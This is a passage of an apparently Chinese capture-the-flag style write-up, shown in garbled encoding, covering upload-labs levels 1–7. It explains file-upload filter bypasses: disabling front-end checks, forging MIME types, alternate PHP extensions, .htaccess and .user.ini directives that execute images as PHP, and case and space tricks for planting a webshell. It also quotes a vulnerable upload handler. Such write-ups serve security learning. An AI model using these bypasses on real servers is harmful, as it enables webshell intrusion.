¼å¼åŒ–ã€å›¾ç‰‡å‹ç¼©ç­‰æ“ä½œï¼Œå¯ä»¥é˜²æ­¢æ”»å‡»è€…æˆåŠŸåœ°æ‰§è¡ŒæŸäº›ç±»å‹çš„æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åœ¨ä¸Šä¼ çš„å›¾ç‰‡ä¸­æ³¨å…¥æ¶æ„ä»£ç æ¥ç»•è¿‡æ£€æŸ¥å¹¶æ‰§è¡Œæ”»å‡»ã€‚ç¡®ä¿å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å†…å®¹æ£€æŸ¥å’Œå¤„ç†æ˜¯å¾ˆå…³é”®çš„ã€‚</p><h1 id="ä¸€äº›å˜é‡"><a href="#ä¸€äº›å˜é‡" class="headerlink" title="ä¸€äº›å˜é‡"></a>ä¸€äº›å˜é‡</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&quot;file&quot;][&quot;name&quot;]  è¢«ä¸Šä¼ æ–‡ä»¶çš„åç§°(æ–‡ä»¶åœ¨å®¢æˆ·ç«¯æœºå™¨ä¸Šçš„åŸå§‹åç§°ã€‚)</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;type&quot;]  è¢«ä¸Šä¼ æ–‡ä»¶çš„MIMEç±»å‹</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;size&quot;]  è¢«ä¸Šä¼ æ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚è®¡</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]  å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§°</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;error&quot;]  ç”±æ–‡ä»¶ä¸Šä¼ å¯¼è‡´çš„é”™è¯¯ä»£ç </span><br></pre></td></tr></table></figure><h1 id="pass-01-å‰ç«¯ç»•è¿‡"><a href="#pass-01-å‰ç«¯ç»•è¿‡" class="headerlink" title="pass-01 å‰ç«¯ç»•è¿‡"></a>pass-01 å‰ç«¯ç»•è¿‡</h1><p>æ³•ä¸€ï¼šè¿™å…³æˆ‘ä»¬æ‰“å¼€f12å°±å¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªå‰ç«¯jsä¹¦å†™çš„wafæˆ‘ä»¬åªéœ€è¦åœ¨æ§åˆ¶å°ç¦ç”¨jså°±å¯ä»¥ä¸Šä¼ æˆåŠŸã€‚<br><img src="/2023/12/15/upload-labs/less1-1.png" class="" title="Alt text"><br>æ³•äºŒï¼šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨bpæ¥å¯¹å…¶è¿›è¡ŒæŠ“åŒ…ï¼Œæˆ‘ä»¬å…ˆå°†ä¸€å¥è¯æœ¨é©¬çš„åç¼€æ”¹ä¸ºgifåœ¨ä¸Šä¼ å¯¹å…¶è¿›è¡ŒæŠ“åŒ…ï¼ŒæŠ“åŒ…åæˆ‘ä»¬åœ¨ä¿®æ”¹å…¶æ–‡ä»¶çš„åç¼€åå³å¯<br><img src="/2023/12/15/upload-labs/less1-2.png" class="" title="Alt text"><br>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªçš„æ‹¦æˆªä»£ç ã€‚å­¦ä¹ ä¸€ä¸‹<br><img src="/2023/12/15/upload-labs/less1-3.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹è§document.getElementsByName(â€˜upload_fileâ€™)[0].valueè¿™ä¸²ä»£ç ä¸‹é¢æ˜¯è§£é‡Š<br>getElementsbyNameçš„ä½œç”¨æ˜¯é€šè¿‡è¡¨å•åç§°ä¹Ÿå°±æ˜¯upload_fileæ¥è·å–å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯ä½ ä¸Šä¼ æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯<br>[0]ï¼š è¿™éƒ¨åˆ†æ˜¯æ•°ç»„ç´¢å¼•ï¼Œå®ƒé€‰æ‹©äº†è·å–åˆ°çš„å…ƒç´ åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚å› ä¸º getElementsByName è¿”å›çš„æ˜¯ä¸€ä¸ª NodeListï¼ˆèŠ‚ç‚¹åˆ—è¡¨ï¼‰ï¼Œå³ä½¿åªæœ‰ä¸€ä¸ªå…ƒç´ ä¹Ÿéœ€è¦ä½¿ç”¨ç´¢å¼•æ¥è®¿é—®ã€‚<br>.valueï¼š ä¸€æ—¦è·å–åˆ°å…ƒç´ ï¼Œ.value ç”¨äºè·å–è¯¥å…ƒç´ çš„å€¼ã€‚å¯¹äºæ–‡ä»¶ä¸Šä¼ è¡¨å•å…ƒç´ ï¼Œå®ƒå°†è¿”å›æ‰€é€‰æ‹©çš„æ–‡ä»¶çš„è·¯å¾„ã€‚<br>ç»¼åˆèµ·æ¥ï¼Œæ•´è¡Œä»£ç çš„ç›®çš„æ˜¯å°†æ–‡ä»¶ä¸Šä¼ è¡¨å•ä¸­é€‰æ‹©çš„æ–‡ä»¶çš„è·¯å¾„èµ‹å€¼ç»™å˜é‡ fileã€‚è¿™é€šå¸¸åœ¨æ–‡ä»¶ä¸Šä¼ éªŒè¯çš„è¿‡ç¨‹ä¸­ç”¨äºæ£€æŸ¥ç”¨æˆ·æ˜¯å¦é€‰æ‹©äº†æ–‡ä»¶ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç”±äºå®‰å…¨åŸå› ï¼Œæµè§ˆå™¨ä¸å…è®¸ JavaScript ç›´æ¥è®¿é—®æ–‡ä»¶è·¯å¾„çš„å®Œæ•´ä¿¡æ¯ï¼Œå› æ­¤å®é™…ä¸Šè¿™åªæ˜¯è¿”å›äº†æ–‡ä»¶åè€Œä¸æ˜¯å®Œæ•´è·¯å¾„ã€‚</p><p>alert()å‡½æ•°æ˜¯jsä»£ç å¼¹å‡ºä¿¡æ¯å°çª—å£çš„å‡½æ•°</p><p>file.substring(file.lastIndexOf(â€œ.â€));<br>è¿™ä¸²ä»£ç ä¸­lastIndex0fçš„ä½œç”¨æ˜¯è·å–.æœ€åä¸€æ¬¡å‡ºç°çš„å¼•ç´¢ä¹Ÿå°±æ˜¯æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œfile.lastIndexOf(â€œ.â€)å°±æ˜¯è·å–fileå˜é‡ä¸­.æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè€Œsubsting()é‡Œé¢çš„å˜é‡è‹¥ä¸ºä¸€ä¸ªåˆ™è¿”å›è¯¥ä½ç½®åˆ°æœ«å°¾çš„å­—ç¬¦ä¸²<br>ç»¼åˆèµ·æ¥ï¼Œfile.substring(file.lastIndexOf(â€œ.â€)) ä¼šæå–æ–‡ä»¶åä¸­çš„æ–‡ä»¶æ‰©å±•åã€‚ä¾‹å¦‚ï¼Œå¦‚æœ file æ˜¯ â€œexample.jpgâ€ï¼Œé‚£ä¹ˆè¿™ä¸ªä»£ç å°†è¿”å› â€œ.jpgâ€ã€‚è¿™å¯¹äºåœ¨æ–‡ä»¶ä¸Šä¼ æ—¶éªŒè¯æ–‡ä»¶ç±»å‹æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚</p><p>allow_ext.indexOf(ext_name + â€œ|â€)ï¼š indexOf æ˜¯å­—ç¬¦ä¸²æ–¹æ³•ï¼Œç”¨äºæŸ¥æ‰¾å­—ç¬¦ä¸²ä¸­æ˜¯å¦åŒ…å«æŒ‡å®šçš„å­å­—ç¬¦ä¸²ã€‚åœ¨è¿™é‡Œï¼Œå®ƒæŸ¥æ‰¾ allow_ext ä¸­æ˜¯å¦åŒ…å« ext_name + â€œ|â€ è¿™ä¸ªå­å­—ç¬¦ä¸²ã€‚ext_name æ˜¯ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åï¼Œç„¶ååœ¨å…¶åé¢æ·»åŠ ä¸€ä¸ªç«–çº¿ â€œ|â€ã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿åªæœ‰å®Œæ•´çš„æ‰©å±•ååŒ¹é…ï¼Œè€Œä¸æ˜¯éƒ¨åˆ†åŒ¹é…ã€‚</p><p>== -1ï¼š å¦‚æœ indexOf æ–¹æ³•æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„å­å­—ç¬¦ä¸²ï¼Œå®ƒå°†è¿”å› -1ã€‚å› æ­¤ï¼Œallow_ext.indexOf(ext_name + â€œ|â€) == -1 è¡¨ç¤ºä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•åä¸åœ¨å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹åˆ—è¡¨ä¸­ã€‚</p><h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><p> è¿™é“é¢˜ç›®è€ƒå¯Ÿçš„MIMEç»•è¿‡ã€‚<br> MIMEæ˜¯ä¸€ç§æ ‡è¯†æ–‡ä»¶ç±»å‹çš„æ ‡å‡†ã€‚å…¶æ ‡è¯†åˆ†ä¸ºï¼š<br> <strong>ä¸»ç±»å‹ï¼šæè¿°äº†æ–‡ä»¶çš„å¤§ç±»å¦‚ï¼šæ–‡æœ¬ï¼ŒéŸ³ä¹ï¼Œå›¾ç‰‡ç­‰</strong><br> <strong>å°ç±»å‹ï¼šè¡¨ç¤ºç²¾ç¡®åˆ°æ–‡ä»¶çš„å…·ä½“ç±»å‹</strong><br> å¦‚ï¼š<br>æ–‡æœ¬æ–‡ä»¶çš„ MIME ç±»å‹æ˜¯ text/plainã€‚<br>JPEG å›¾ç‰‡çš„ MIME ç±»å‹æ˜¯ image/jpegã€‚<br>MP3 éŸ³é¢‘çš„ MIME ç±»å‹æ˜¯ audio/mp3ã€‚<br>åœ¨æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ã€Web å¼€å‘ç­‰åœºæ™¯ä¸­ï¼ŒMIME ç±»å‹çš„æ­£ç¡®è®¾ç½®å¯¹äºç¡®ä¿æ–‡ä»¶æŒ‰é¢„æœŸæ–¹å¼å¤„ç†å’Œæ˜¾ç¤ºè‡³å…³é‡è¦ã€‚ä¾‹å¦‚ï¼Œåœ¨ Web å¼€å‘ä¸­ï¼ŒæœåŠ¡å™¨é€šè¿‡è®¾ç½® HTTP å¤´éƒ¨ä¸­çš„ Content-Type å­—æ®µæ¥æŒ‡å®šå“åº”çš„ MIME ç±»å‹ã€‚</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>é€šè¿‡ä¸Šè¿°çš„æè¿°æˆ‘ä»¬å¯ä»¥çŸ¥é“MIMEåœ¨webä¸­æ˜¯é€šè¿‡httpçš„è¯·æ±‚å¤´ä¸­çš„Content-Typeæ¥æŒ‡å®šç±»å‹çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿›è¡ŒæŠ“åŒ…ä»è€Œä¿®æ”¹Content-Typeçš„å€¼ä»è€Œä¿®æ”¹åç«¯æ‰€è¯†åˆ«çš„MIMEã€‚</p><h3 id="ä¸Šä¼ å§¿åŠ¿ä¸€"><a href="#ä¸Šä¼ å§¿åŠ¿ä¸€" class="headerlink" title="ä¸Šä¼ å§¿åŠ¿ä¸€"></a>ä¸Šä¼ å§¿åŠ¿ä¸€</h3><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¸Šä¼ åç¼€åè¢«ä¿®æ”¹ä¸ºjpgçš„ä¸€å¥è¯æœ¨é©¬ï¼Œåœ¨æŠ“åŒ…è½¯ä»¶ä¸­å¯¹å…¶åç¼€åè¿›è¡Œä¿®æ”¹ã€‚<br><img src="/2023/12/15/upload-labs/2-1.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹è§å…¶æ ‡å¤´Content-Typeä¸ºimage/jpegæˆ‘ä»¬å°†æ–‡ä»¶çš„åç¼€åè¿›è¡Œä¿®æ”¹ï¼ŒæˆåŠŸç»•è¿‡ã€‚é‚£ä¹ˆä¹Ÿå°±è¯æ˜äº†åç«¯å€¼æŸ¥è¯¢æ ‡å¤´ä¼ å…¥çš„å†…å®¹è€Œä¸ç›´æ¥æŸ¥è¯¢æ–‡ä»¶ã€‚è¿™å°±æ˜¯MIMEçš„å¼Šç«¯</p><h3 id="å§¿åŠ¿äºŒ-MINEç»•è¿‡"><a href="#å§¿åŠ¿äºŒ-MINEç»•è¿‡" class="headerlink" title="å§¿åŠ¿äºŒ MINEç»•è¿‡"></a>å§¿åŠ¿äºŒ MINEç»•è¿‡</h3><p>æˆ‘ä»¬ä»ä¸Šä¸€ä¸ªæ–¹æ³•å¯ä»¥äº†è§£åˆ°åªè¦Content-Typeæ‰€è¡¨ç¤ºçš„æ–‡ä»¶æ ¼å¼ä¸ºç…§ç‰‡æ–‡ä»¶å°±å¯ä»¥æˆåŠŸä¸Šä¼ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶ç„¶åä¿®æ”¹Content-Typeä»¥æ­¤æ¥ç»•è¿‡<br><img src="/2023/12/15/upload-labs/2-2.png" class="" title="Alt text"><br>æˆ‘ä»¬ç›´æ¥å°†Content-Typeæ”¹ä¸ºimage/jpegæˆåŠŸä¸Šä¼ </p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// æ ‡å¿—æ–‡ä»¶æ˜¯å¦æˆåŠŸä¸Šä¼ çš„å˜é‡</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// å­˜å‚¨ä¸Šä¼ ç»“æœæ¶ˆæ¯çš„å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123; <span class="comment">// æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="comment">// æ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹æ˜¯å¦æ˜¯å…è®¸çš„å›¾ç‰‡ç±»å‹ï¼ˆJPEGã€PNGã€GIFï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) ||</span><br><span class="line">            (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) ||</span><br><span class="line">            (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// ä¸´æ—¶å‰¯æœ¬</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]; </span><br><span class="line">            <span class="comment">// ä¸Šä¼ æ–‡ä»¶çš„ç›®æ ‡è·¯å¾„(å°±æ˜¯å°†ç›®å½•å’Œåå­—è¿˜/ç”¨.æ¥æ‹¼æ¥)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// æ ‡è®°æ–‡ä»¶ä¸Šä¼ æˆåŠŸ</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>; <span class="comment">// æ–‡ä»¶ç§»åŠ¨å¤±è´¥æ—¶çš„é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼&#x27;</span>; <span class="comment">// æ–‡ä»¶ç±»å‹ä¸ç¬¦åˆè¦æ±‚æ—¶çš„é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨ï¼Œè¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>; <span class="comment">// ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨æ—¶çš„é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>move_uploaded_file($temp_file, $img_path)</code>å‡½æ•°æŠŠä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚<br>å¦‚æœæˆåŠŸè¯¥å‡½æ•°è¿”å› TRUEï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å› FALSEã€‚<br>è¯­æ³•ï¼š<br>move_uploaded_file(file,newloc)<br>file å¿…éœ€ã€‚è§„å®šè¦ç§»åŠ¨çš„æ–‡ä»¶ã€‚<br>newloc å¿…éœ€ã€‚è§„å®šæ–‡ä»¶çš„æ–°ä½ç½®ã€‚<br>é€šè¿‡åˆ†ææˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¿™ä¸ªæºç æ˜¯å°†æ–‡ä»¶çš„MIMEç±»å‹è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸ºç…§ç‰‡ç±»å‹ä¸”æ–‡ä»¶æ²¡æœ‰é‡å¤ä¸Šä¼ åˆ™å¯ä»¥è¿›è¡Œä¸Šä¼ </p><h1 id="pass-03-php4-5ç»•è¿‡ï¼Œpbé‡å‘å™¨å“åº”æŸ¥çœ‹éšæœºæ•°æ–‡ä»¶åå­—"><a href="#pass-03-php4-5ç»•è¿‡ï¼Œpbé‡å‘å™¨å“åº”æŸ¥çœ‹éšæœºæ•°æ–‡ä»¶åå­—" class="headerlink" title="pass-03 php4,5ç»•è¿‡ï¼Œpbé‡å‘å™¨å“åº”æŸ¥çœ‹éšæœºæ•°æ–‡ä»¶åå­—"></a>pass-03 php4,5ç»•è¿‡ï¼Œpbé‡å‘å™¨å“åº”æŸ¥çœ‹éšæœºæ•°æ–‡ä»¶åå­—</h1><p>è¯¥é¢˜ç›®ä½¿ç”¨è™½ç„¶ç¦æ­¢äº†phpï¼Œä½†æ˜¯æ²¡æœ‰ç¦æ­¢php2ï¼Œphp3ï¼Œphp4ï¼Œphp5,PHTML,phtç­‰<br>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¤šäº†ä¸€ä¸ªä»£ç <code>$img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code>æˆ‘ä»¬éƒ½çŸ¥é“$img_pathå˜é‡ä¸ºæ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„ï¼Œè€Œè¯¥é¢˜ç›®å’Œå…¶ä»–é¢˜ç›®æœ‰æ‰€ä¸åŒè¯¥é¢˜ç›®çš„æ–‡ä»¶è·¯å¾„åä¹Ÿå°±æ˜¯å˜é‡$img_pathä¸ºæ–‡ä»¶åUPLOAD_PATHåŠ ä¸Š/åœ¨åŠ ä¸Šdate(â€œYmdHisâ€)ä¹Ÿå°±æ˜¯ç³»ç»Ÿæ—¶é—´åœ¨åŠ ä¸Šrand(1000,9999)ä¹Ÿå°±æ˜¯1000åˆ°9999çš„éšæœºæ•°ã€‚<br>ä½¿ç”¨è¿™é¢˜æˆ‘ä»¬éœ€è¦ç”¨bpæŠ“åŒ…åˆ©ç”¨é‡å‘å™¨ï¼Œåå†æŸ¥çœ‹å“åº”ä¹‹åä¾¿å¯ä»¥æŸ¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶ä½ç½®ã€‚</p><h1 id="pass-04-htaccessç»•è¿‡"><a href="#pass-04-htaccessç»•è¿‡" class="headerlink" title="pass-04 .htaccessç»•è¿‡"></a>pass-04 .htaccessç»•è¿‡</h1><img src="/2023/12/15/upload-labs/4-1.png" class=""><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŸºæœ¬ä¸ŠæŠŠæ‰€æœ‰çš„æ–‡ä»¶éƒ½ç»™ç¦äº†é‚£ä¹ˆå°±éœ€è¦è¯·å‡ºåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶.htaccessäº†ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸apacheéƒ¨ç½²çš„ç½‘ç«™æœ‰å…³ï¼Œhttpd.confå°±æ˜¯apacheæœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼Œä½†æ˜¯ç”±äºåœ¨å¤šäººå¼€å‘æ—¶ï¼Œéšæ„ä¿®æ”¹http.confæ–‡ä»¶ä¼šå¯¼è‡´é…ç½®å¯èƒ½å‡ºç°é—®é¢˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶.htaccessäº†ã€‚è¿™ä¸ªæ–‡ä»¶ä¼šä¸httpd.confç›¸ä¼¼ã€‚ä¼šå°†è¦†ç›–è¯¥æ–‡ä»¶çš„ç›®å½•åŠå…¶å­ç›®å½•ä¸‹çš„http.confçš„å…¨å±€é…ç½®é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶æ¥å°†ä¿®æ”¹å…¶é…ç½®ä½¿æˆ‘ä»¬æˆåŠŸä¸Šä¼ ã€‚<br>1.ä¿®æ”¹é…ç½®ä½¿å…¶å°†jpgæ–‡ä»¶å½“æˆphpæ‰§è¡Œã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬åªè¦ä¸Šä¼ .htaccessåœ¨ä¸Šä¼ .pngçš„ä¸€å¥è¯æœ¨é©¬åœ¨ç”¨èšå‰‘è¿æ¥å³å¯ã€‚<br>2.è‹¥æ–‡ä»¶ååŒ…å«.phpå…³é”®è¯ä¾¿æŒ‰ç…§phpæ–‡ä»¶è¿è¡Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php5-script .php</span><br></pre></td></tr></table></figure><br>3.æŒ‡å®šæ–‡ä»¶åç§°ä½¿å…¶ä»¥phpå½¢å¼æ‰§è¡Œ<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch &quot;muma&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure><br>ç›´æ¥ä¸Šä¼ ä¸€ä¸ªåå­—åŒ…å«mumaçš„æ–‡ä»¶åï¼Œä½¿ç”¨èšå‰‘<br>strrchr($file_name, â€˜.â€™)<br>åä¼šæœ€åä¸€ä¸ª.åŠå…¶åé¢çš„å­—ç¬¦ä¸²<br>trim($_FILES[â€˜upload_fileâ€™][â€˜nameâ€™]);<br>åˆ å»ä¸¤è¾¹ç©ºæ ¼</p><h1 id="pass-05-user-iniç»•è¿‡"><a href="#pass-05-user-iniç»•è¿‡" class="headerlink" title="pass-05 .user.iniç»•è¿‡"></a>pass-05 .user.iniç»•è¿‡</h1><p>è¿™é“é¢˜ç›®æˆ‘ä»¬å‘ç°è¿.htaccesséƒ½è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è§‚å¯Ÿæºç å‘ç°åªæœ‰å¯¹ç‚¹å’Œç©ºæ ¼è¿›è¡Œä¸€æ¬¡åˆ é™¤ç»™é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨bpæŠ“åŒ…å°†åé¢çš„åç¼€æ”¹ä¸ºphp. .åŒç†å‰é¢çš„é¢˜ç›®ä¹Ÿå¯ä»¥è¿™ä¹ˆç»•è¿‡ã€‚</p><h1 id="æ³•äºŒ"><a href="#æ³•äºŒ" class="headerlink" title="æ³•äºŒ"></a>æ³•äºŒ</h1><p>è¿™é¢˜ç›®æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç§phpçš„é…ç½®æ–‡ä»¶å«åš.user.iniã€‚æˆ‘ä»¬çŸ¥é“php.iniè€Œ.user.iniæ–‡ä»¶æ˜¯phpçš„é…ç½®æ–‡ä»¶è¿™ä¸ªæ˜¯phpçš„ç”¨æˆ·çº§é…ç½®æ–‡ä»¶ï¼Œå› ä¸ºè¿™å…³çš„æ²¡æœ‰ç¦ç”¨phpç”¨æˆ·çº§é…ç½®æ–‡ä»¶å³.user.iniæ‰€æœ‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªé…ç½®æ–‡ä»¶è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepand_file=muma.jpg</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„æ„æ€ä¸ºå°†muma.jpgçš„å†…å®¹æ‹¼æ¥åˆ°æ‰€æœ‰phpæ–‡ä»¶é‡Œ<br>ç„¶åæˆ‘ä»¬ä¸Šä¼ .user.iniåœ¨ä¸Šä¼ muma.jpgè¿™æ ·å°±ä¼šæ˜¯muma.jpgçš„å†…å®¹è¢«æ‹¼æ¥çš„phpæ–‡ä»¶é‡Œ</p><h1 id="pass-06-å¤§å°å†™ç»•è¿‡"><a href="#pass-06-å¤§å°å†™ç»•è¿‡" class="headerlink" title="pass-06 å¤§å°å†™ç»•è¿‡"></a>pass-06 å¤§å°å†™ç»•è¿‡</h1><img src="/2023/12/15/upload-labs/5-1.png" class="" title="Alt text"><p>è¿™é“é¢˜ç›®æˆ‘ä»¬å®¡æŸ¥ä»£ç å‘ç°äº†ä¸€ä¸ªé—®é¢˜å°±æ˜¯ç¼ºå°‘äº†strtolower()å‡½æ•°å¯¼è‡´æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åä¸ä¼šè¢«æ”¹ä¸ºå°å†™ã€‚è€Œå­—ç¬¦ä¸²çš„åŒ¹é…å‡½æ•°in_array()åŒ¹é…å­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨äºæ•°ç»„ä¸­è¿™ä¹Ÿå°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤§å†™çš„PHPä»¥æ­¤æ¥ç»•è¿‡å› ä¸ºå¤§å†™PHPä¸åœ¨æ•°ç»„deny_extã€‚æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ç»•è¿‡</p><h1 id="pass-07-ç©ºæ ¼ç»•è¿‡"><a href="#pass-07-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="pass-07 ç©ºæ ¼ç»•è¿‡"></a>pass-07 ç©ºæ ¼ç»•è¿‡</h1><p>è¿™é“é¢˜ç›®æˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°å…¶å› ä¸ºç¼ºå°‘äº†trim()å‡½æ•°æ‰€æœ‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç©ºæ ¼ç»•è¿‡å°±æ˜¯å†åé”¥ååŠ 